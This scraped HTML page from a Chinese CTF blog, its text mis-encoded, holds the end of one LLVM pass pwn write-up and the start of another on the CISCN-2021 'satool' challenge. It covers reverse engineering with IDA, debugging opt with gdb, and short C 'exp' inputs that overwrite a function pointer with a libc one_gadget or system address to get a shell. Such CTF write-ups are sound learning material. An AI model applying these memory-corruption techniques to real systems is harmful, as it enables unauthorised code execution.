class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">	add(<span class="number">1</span>, <span class="number">0x77E100</span>);</span><br><span class="line">	load(<span class="number">1</span>);</span><br><span class="line">	add(<span class="number">2</span>, <span class="number">0x4942e</span>);</span><br><span class="line">	store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å°è¯•è¿è¡Œï¼Œå‘ç°3ä¸ªone_gadgetéƒ½ä¸è¡Œï¼Œåº”è¯¥æ˜¯one_gadgetçš„æ¡ä»¶ä¸æ»¡è¶³ã€‚å› æ­¤è€ƒè™‘å†™å…¥systemå‡½æ•°çš„åœ°å€ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªåä¸ºshçš„å‡½æ•°ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ‰§è¡Œåˆ°system(â€œshâ€)ã€‚systemå‡½æ•°çš„libcåç§»ä¸º0x52290ã€‚</p>
<p>expï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">	add(<span class="number">1</span>, <span class="number">0x77E100</span>);</span><br><span class="line">	load(<span class="number">1</span>);</span><br><span class="line">	add(<span class="number">2</span>, <span class="number">0x52290</span>);</span><br><span class="line">	store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sh</span><span class="params">()</span>&#123;&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="13.png" alt="" /><br />
å¯æƒœï¼Œè¿˜æ˜¯ä¸è¡Œã€‚ä½¿ç”¨åŸæ¥çš„libcåº”è¯¥æ˜¯å¯ä»¥è·‘one_gadgetçš„ï¼Œå› ä¸ºæœ‰ä¸¤ä¸ªone_gadgetçš„æ¡ä»¶æ˜¯æ ˆä¸­æŸå¤„ä¸º0ï¼Œç›¸å¯¹æ¥è¯´æ›´å®¹æ˜“æ»¡è¶³ä¸€äº›ã€‚ç¬”è€…å°è¯•é€šè¿‡è¿½è¸ªå‡½æ•°è°ƒç”¨é“¾è·å–åˆ°VMPass.soçš„åŠ è½½åŸºå€ï¼Œä½†å‘ç°VMPass.soçš„runOnFunctionå‡½æ•°æ˜¯é€šè¿‡callå¯„å­˜å™¨çš„æ–¹å¼è°ƒç”¨çš„ï¼Œç›®å‰å°šæ— æ€è·¯ã€‚ä¸è¿‡è¿™é“é¢˜æœ¬èº«è¿˜æ˜¯ä¸éš¾ç†è§£çš„ï¼Œèƒ½å¤Ÿåšåˆ°ä¿®æ”¹one_gadgetå°±å·²ç»è¶³å¤Ÿäº†ã€‚</p>
<p>ä¸‹ä¸€ç¯‡æ–‡ç« ç¬”è€…å°†ä¼šåˆ†æä»Šå¹´ï¼ˆ2022ï¼‰å›½èµ›é¢˜çš„satoolï¼Œçœ‹ä¸€ä¸‹å’Œå»å¹´çš„åŒåé¢˜æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-2/" class="post-title-link" itemprop="url">LLVM pass pwn å…¥é—¨ (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:36:53" itemprop="dateCreated datePublished" datetime="2023-02-28T22:36:53+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:45" itemprop="dateModified" datetime="2023-03-01T11:30:45+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ ç¬”è®°</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/llvm-pass-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">llvm pass pwn ç³»åˆ—</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>18 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>æœ¬æ–‡æ¥åˆ†æå‡ é“é¢˜ç›®ï¼Œç†Ÿæ‚‰ä¸‹LLVM pass pwnçš„è§£é¢˜æµç¨‹ã€‚</p>
<h1 id="ciscn-2021-satool"><a class="markdownIt-Anchor" href="#ciscn-2021-satool"></a> CISCN-2021 satool</h1>
<p>å›½èµ›é¢˜ï¼Œ2022å¹´ä¹Ÿå‡ºäº†ä¸€é“åå­—éƒ½ä¸€æ ·çš„é¢˜ï¼Œå¯è§å›½èµ›è¿˜æ˜¯å¾ˆé‡è§†è¿™ç±»é¢˜å‹çš„ã€‚</p>
<p>è¿™ä¸€é¢˜çš„é™„ä»¶å¾ˆéš¾æ‰¾ï¼Œç¬”è€…å°†å…¶æ”¾åœ¨äº†è‡ªå·±çš„<a target="_blank" rel="noopener" href="https://github.com/Hornos3/pwnfile">github</a>ä¸­ï¼Œä¾¿äºè¯»è€…å¤ç°ã€‚</p>
<p>é¦–å…ˆå½“ç„¶æ˜¯ä½¿ç”¨IDAæ‰“å¼€ã€‚å‘ç°ç¬¦å·è¡¨è¢«æŠ äº†ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜æ˜¯æœ‰å®šä½runOnFunctionçš„æ–¹æ³•ã€‚<br />
éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé¢˜ç›®ä¸­ç»™çš„runOnFunctionå‡½æ•°æ˜¯è¦†å†™çš„llvmåº“ä¸­çš„runOnFunctionæ–¹æ³•ï¼Œå› æ­¤å…¶ä¸€å®šä¼šè¢«vtableè¡¨å¼•ç”¨ï¼Œè€Œvtableè¡¨åœ¨.rodataæ®µä¸­ï¼Œåªéœ€è¦è°ƒåˆ°IDA-viewç•Œé¢æŸ¥çœ‹åå­—æœªçŸ¥çš„å‡½æ•°ä¸­å“ªä¸€ä¸ªæœ‰è¶³å¤Ÿçš„é•¿åº¦ï¼Œè€Œä¸”è¢«.rodataæ®µå¼•ç”¨å³å¯ã€‚</p>
<p><img src="1.png" alt="" /><br />
å‘ç°çº¢æ¡†ä¸­çš„ä¸¤ä¸ªå‡½æ•°éƒ½æœ‰è¶³å¤Ÿçš„é•¿åº¦ï¼Œä½†æ˜¯åªæœ‰sub_19D0è¢«.rodataæ®µå¼•ç”¨ï¼Œå› æ­¤åˆ¤å®šè¿™å°±æ˜¯è¦†å†™çš„runOnFunctionæ–¹æ³•äº†ã€‚</p>
<p>ç”±äºæˆ‘ä»¬æœ‰llvmçš„æ‰€æœ‰å¤´æ–‡ä»¶æºç ï¼Œå› æ­¤å¯¹äº.soæ–‡ä»¶ä¸­llvmæ–¹æ³•çš„è°ƒç”¨ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥æ‰¾åˆ°ç›¸åº”çš„å£°æ˜ï¼Œæœ‰åŠ©äºæˆ‘ä»¬ç†è§£ä»£ç æœ¬èº«ã€‚</p>
<h2 id="1-é€†å‘åˆ†æ"><a class="markdownIt-Anchor" href="#1-é€†å‘åˆ†æ"></a> 1. é€†å‘åˆ†æ</h2>
<p><img src="2.png" alt="" /><br />
é¦–å…ˆè¿›è¡Œçš„æ˜¯ä¸¤ä¸ªæ¡ä»¶åˆ¤æ–­ï¼Œè¿™é‡Œåˆ¤æ–­rdxæ˜¯å¦ä¸º8ï¼Œå‡½æ•°çš„è¿”å›å€¼æ˜¯å¦ç­‰äºè¯¥å­—ç¬¦ä¸²çš„å€¼ã€‚ç»è¿‡è°ƒè¯•å‘ç°ï¼Œä¸Šé¢çš„å‡½æ•°<code>getName()</code>çš„è¿”å›å€¼æ˜¯<code>llvm::value</code>å¯¹è±¡çš„åå­—ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>llvm::value</code>æ˜¯llvmä¸­æœ€é‡è¦çš„ä¸€ä¸ªç±»ï¼Œå…¶å¯ä»¥ä»£è¡¨ä¸€ä¸ªå¸¸é‡ã€å˜é‡ã€æŒ‡ä»¤æˆ–å‡½æ•°ã€‚è¿™é‡Œå¯ä»¥çœ‹åˆ°å¦‚æœå¯¹è±¡çš„åå­—ä¸æ˜¯<code>B4ckDo0r</code>ï¼Œåˆ™ä¼šç›´æ¥é€€å‡ºä¸ä½œå¤„ç†ã€‚è¦æƒ³è¿›è¡Œä¸‹é¢çš„å¤„ç†ï¼Œæˆ‘ä»¬å°±å¿…é¡»è¦è®©ä¸€ä¸ªå‡½æ•°çš„åå­—ä¸º<code>B4ckDo0r</code>ã€‚è‡³äºå‰é¢å¯¹rdxçš„åˆ¤æ–­ï¼Œè¿™åº”è¯¥ä¹Ÿç®—æ˜¯<code>getName()</code>å‡½æ•°çš„è¿”å›å€¼ï¼Œå…¶è¡¨ç¤ºçš„æ˜¯å¯¹è±¡åå­—çš„é•¿åº¦ã€‚æ˜¾è€Œæ˜“è§ï¼Œ<code>B4ckDo0r</code>çš„é•¿åº¦ä¸º8ï¼Œå› æ­¤è¿™é‡Œåˆ¤æ–­é•¿åº¦æ˜¯å¦ä¸º8åˆæƒ…åˆç†ã€‚</p>
<p>æ³¨ï¼šè¿™é‡Œè¯´æ˜ä¸€ä¸‹llvm passç±»é¢˜ç›®å¦‚ä½•è°ƒè¯•ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦é€šè¿‡optç¨‹åºåŠ è½½.soé“¾æ¥åº“ï¼ŒåŒæ—¶è¾“å…¥.llæ–‡ä»¶ä»¥ç”ŸæˆIRè¾“å‡ºï¼Œå› æ­¤åº”è¯¥è°ƒè¯•optè¿™ä¸ªç¨‹åºï¼ˆå¸¦å‚æ•°çš„optè°ƒè¯•æ–¹å¼ï¼š<code>gdb opt</code>ã€<code>r å‚æ•°, å‚æ•°,...</code>ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå¯¹optä¸‹ä¸€ä¸ªåœ¨mainå¼€å¤´çš„æ–­ç‚¹ï¼Œä¿è¯å…¶åœ¨ä¸€å¼€å§‹æ‰§è¡Œå°±èƒ½å¤Ÿä¸­æ–­ï¼Œæ³¨æ„æ­¤æ—¶.soé“¾æ¥åº“å¹¶æœªè¢«åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œæœ¬é¢˜çš„optç¨‹åºä¸­åœ¨mainå‡½æ•°æœ‰ä¸€å †å‡½æ•°è°ƒç”¨ï¼Œå¿«é€Ÿæ­¥è¿‡åç»è¿‡æŸä¸€æ¡callæŒ‡ä»¤å¯ä»¥å‘ç°.soåº“è¢«åŠ è½½ï¼Œæ­¤æ—¶å†ä¸‹é“¾æ¥åº“çš„æ–­ç‚¹ï¼Œç»§ç»­æ‰§è¡Œå°±å¯ä»¥è®©ç¨‹åºæ–­åœ¨æˆ‘ä»¬æƒ³è¦è°ƒè¯•çš„runOnFunction()å‡½æ•°äº†ã€‚è¿™ç§æ–¹å¼æ˜¯ç¬”è€…è‡ªå·±æ¢ç´¢å‡ºæ¥çš„ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œä½†ç”±äºè¿™æ–¹é¢çš„èµ„æ–™å®åœ¨å¤ªå°‘ï¼Œæ‰¾ä¸åˆ°ç°æˆçš„å‚è€ƒï¼Œåªèƒ½å…ˆè¿™æ ·åšäº†ã€‚å¦‚æœ‰æ›´åŠ ç®€ä¾¿çš„æ–¹æ³•è¿˜è¯·è¯»è€…ä¸åèµæ•™ã€‚</p>
<p>å‰é¢æˆ‘ä»¬çŸ¥é“äº†åªæœ‰åä¸º<code>B4ckDo0r</code>çš„å‡½æ•°æ‰èƒ½è¢«ä¼˜åŒ–ï¼Œåé¢çš„ä»£ç é”™ç»¼å¤æ‚ï¼Œæ‰‹åŠ¨åœ°å»ä¸€æ­¥æ­¥åˆ†ææ˜¾ç„¶æ˜¯ä¸å¤ªç°å®çš„ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ä¸€ä¸‹ç¨‹åºä¸­æåˆ°çš„å­—ç¬¦ä¸²ï¼Œçœ‹èƒ½ä¸èƒ½æ‰¾åˆ°ä¸€äº›æµç¨‹æ§åˆ¶çš„çº¿ç´¢ã€‚</p>
<p><code>(line 175) if ( !(unsigned int)str_compare(&amp;p_dest, &quot;save&quot;) )</code><br />
<code>(line 300) if ( (unsigned int)str_compare(&amp;p_dest, &quot;takeaway&quot;) )</code><br />
<code>(line 444) if ( !(unsigned int)str_compare(&amp;p_dest, &quot;stealkey&quot;) )</code><br />
<code>(line 469) if ( !(unsigned int)str_compare(&amp;p_dest, &quot;fakekey&quot;) )</code><br />
<code>(line 517) if ( !(unsigned int)str_compare(&amp;p_dest, &quot;fakekey&quot;) )</code></p>
<p>æˆ‘ä»¬å¾ˆå®¹æ˜“èƒ½å¤Ÿæ‰¾åˆ°ä¸Šé¢çš„å‡ è¡Œè¯­å¥ï¼Œè¿™é‡Œçš„saveã€takeawayç­‰å­—ç¬¦ä¸²æ˜¾ç„¶æ˜¯çªç ´çš„å…³é”®æ‰€åœ¨ã€‚</p>
<p>ç»è¿‡è°ƒè¯•å‘ç°ï¼Œè¿™é‡Œçš„<code>&amp;p_dest</code>æŒ‡çš„æ˜¯å‡½æ•°ä¸­æ“ä½œç¬¦çš„åå­—ï¼Œå¦‚ç¬¬ä¸€æ¡è¯­å¥è°ƒç”¨printfå‡½æ•°æ—¶ï¼Œæ“ä½œç¬¦åå³ä¸ºprintfã€‚å› æ­¤æˆ‘ä»¬ä¸ä»…è¦ä¿è¯å…¶å‡½æ•°åä¸º<code>B4ckDo0r</code>ï¼Œè¿˜è¦ä¿è¯å…¶ä¸­è°ƒç”¨çš„å‡½æ•°åä¸ºä¸Šé¢äº”ä¸ªå­—ç¬¦ä¸²ä¸­çš„ä¸€ä¸ªã€‚</p>
<p>åœ¨saveæ§åˆ¶æµç¨‹ä¸­ï¼Œæˆ‘ä»¬å‘ç°äº†è¿™äº›ä»£ç ï¼Œé€šè¿‡å­—ç¬¦ä¸²å¯ä»¥çŒœæµ‹å‡ºè¿™åº”è¯¥æ˜¯æŠ¥é”™ä¿¡æ¯ï¼Œå¯¹äºä½¿ç”¨Cè¯­è¨€ç¨‹åºæ­£å¸¸ç”Ÿæˆçš„.llæ–‡ä»¶ï¼Œåº”è¯¥ä¸ä¼šæœ‰è¿™æ ·çš„é—®é¢˜å‡ºç°ã€‚å› æ­¤åœ¨ä¸‹é¢å‡¡æ˜¯çœ‹åˆ°è·³è½¬åˆ°è¿™äº›labelçš„ä»£ç ï¼Œå°±ç»Ÿç»Ÿéƒ½å¯ä»¥ä¸çœ‹äº†ï¼Œèƒ½å¤ŸèŠ‚çœå¾ˆå¤šæ—¶é—´ã€‚</p>
<p><img src="3.png" alt="" /><br />
å‰”é™¤æ‰è¿™äº›æ£€æŸ¥çš„ä»£ç ä¹‹åï¼Œæˆ‘ä»¬å‘ç°çœŸæ­£å¯¹æˆ‘ä»¬æœ‰ç”¨çš„ä»£ç å®é™…ä¸Šä¹Ÿå°±è¿™ä¹ˆå‡ è¡Œã€‚</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// save</span></span><br><span class="line">            v31 = n;</span><br><span class="line">            v32 = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">            v32[<span class="number">2</span>] = byte_2040f8;</span><br><span class="line">            byte_2040f8 = v32;</span><br><span class="line">            v33 = (<span class="type">char</span> *)src;</span><br><span class="line">            <span class="built_in">memcpy</span>(v32, src, v31);</span><br><span class="line">            v34 = v32 + <span class="number">1</span>;</span><br><span class="line">            v35 = (<span class="type">char</span> *)v84[<span class="number">0</span>];</span><br><span class="line">            <span class="built_in">memcpy</span>(v34, v84[<span class="number">0</span>], (<span class="type">size_t</span>)v84[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span> ( v35 != &amp;v85 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v35)</span></span>;</span><br><span class="line">              v33 = (<span class="type">char</span> *)src;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v33 != v88 )</span><br><span class="line">              <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v33)</span></span>;</span><br><span class="line"><span class="comment">// stealkey</span></span><br><span class="line">          v66 = llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>));</span><br><span class="line">          <span class="keyword">if</span> ( byte_2040f8</span><br><span class="line">            &amp;&amp; !(<span class="number">-1431655765</span></span><br><span class="line">               * (<span class="type">unsigned</span> <span class="type">int</span>)((v15</span><br><span class="line">                               + <span class="number">24</span> * v65</span><br><span class="line">                               - <span class="number">24LL</span> * v66</span><br><span class="line">                               - (v8</span><br><span class="line">                                - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)(*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>))) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">          &#123;</span><br><span class="line">            byte_204100 = *byte_2040f8;</span><br><span class="line">          &#125;</span><br><span class="line"><span class="comment">// fakekey</span></span><br><span class="line">              v76 = byte_204100;</span><br><span class="line">              <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v75 + <span class="number">16LL</span>) == <span class="number">13</span> )</span><br><span class="line">                SExtValue = llvm::APInt::<span class="built_in">getSExtValue</span>((llvm::APInt *)(*(_QWORD *)v75 + <span class="number">24LL</span>));</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                SExtValue = <span class="number">0LL</span>;</span><br><span class="line">              byte_204100 = v76 + SExtValue;</span><br><span class="line">              *byte_2040f8 = v76 + SExtValue;</span><br><span class="line"><span class="comment">// run</span></span><br><span class="line">          <span class="keyword">if</span> ( !(<span class="number">-1431655765</span></span><br><span class="line">               * (<span class="type">unsigned</span> <span class="type">int</span>)((v15</span><br><span class="line">                               + <span class="number">24</span> * v80</span><br><span class="line">                               - <span class="number">24LL</span></span><br><span class="line">                               * (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>))</span><br><span class="line">                               - (v8</span><br><span class="line">                                - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)(*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>))) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">            ((<span class="built_in">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*byte_2040f8)(</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( p_dest != &amp;dest )</span><br><span class="line">          <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(p_dest)</span></span>;</span><br><span class="line">        v7 = v83;</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„saveä¸­çš„mallocå‡½æ•°ï¼Œå®ƒåˆ†é…äº†ä¸€ä¸ª0x20å¤§å°çš„chunkåˆ°bssæ®µä¸­ï¼Œéšåè¿›è¡Œäº†ä¸¤æ¬¡memcpyå†…å­˜æ‹·è´å‘é‡Œé¢å†™å…¥äº†æŸäº›å€¼ï¼Œå…·ä½“æ“ä½œå¦‚ä½•æˆ‘ä»¬ä¸‹é¢è°ƒè¯•çš„æ—¶å€™å†è¡Œåˆ†æã€‚åœ¨takeawayä¸­æœ‰ä¸€å¤§å †çš„æ¡ä»¶ï¼Œä½†æœ€ç»ˆåªæœ‰ä¸€ä¸ªfreeï¼ŒçŒœæµ‹æ˜¯æ»¡è¶³æŸäº›æ¡ä»¶åä¼šé‡Šæ”¾saveä¸­åˆ†é…çš„chunkã€‚åœ¨stealkeyä¸­å°†chunkåœ°å€ä¿å­˜åˆ°äº†å¦å¤–ä¸€ä¸ªä½ç½®ï¼Œä¸”è¿™ä¸ªä½ç½®å°±åœ¨ä¿å­˜chunkåœ°å€çš„ä½ç½®çš„ä¸Šé¢ã€‚åœ¨fakekeyä¸­å°†ä¿å­˜chunkåœ°å€çš„åœ°æ–¹å†™å…¥äº†æŸä¸ªå€¼ã€‚åœ¨runä¸­å°†ä¿å­˜chunkçš„åœ°å€ä½œä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ‰§è¡Œã€‚å¯è§å¦‚æœèƒ½å¤Ÿåœ¨ä¿å­˜chunkçš„åœ°æ–¹å†™å…¥one_gadgetï¼Œå°±èƒ½å¤Ÿæ‰“é€šè¿™é“é¢˜äº†ã€‚</p>
<p>ä¸‹é¢å¼€å§‹è°ƒè¯•ã€‚</p>
<h2 id="2-è°ƒè¯•ä¸è§£é¢˜"><a class="markdownIt-Anchor" href="#2-è°ƒè¯•ä¸è§£é¢˜"></a> 2. è°ƒè¯•ä¸è§£é¢˜</h2>
<p>ç¬¬ä¸€æ¬¡æµ‹è¯•ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;654321&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;abcdef&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;fedcba&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;888888&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">	save();</span><br><span class="line">	takeaway();</span><br><span class="line">	stealkey();</span><br><span class="line">	fakekey();</span><br><span class="line">	run();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
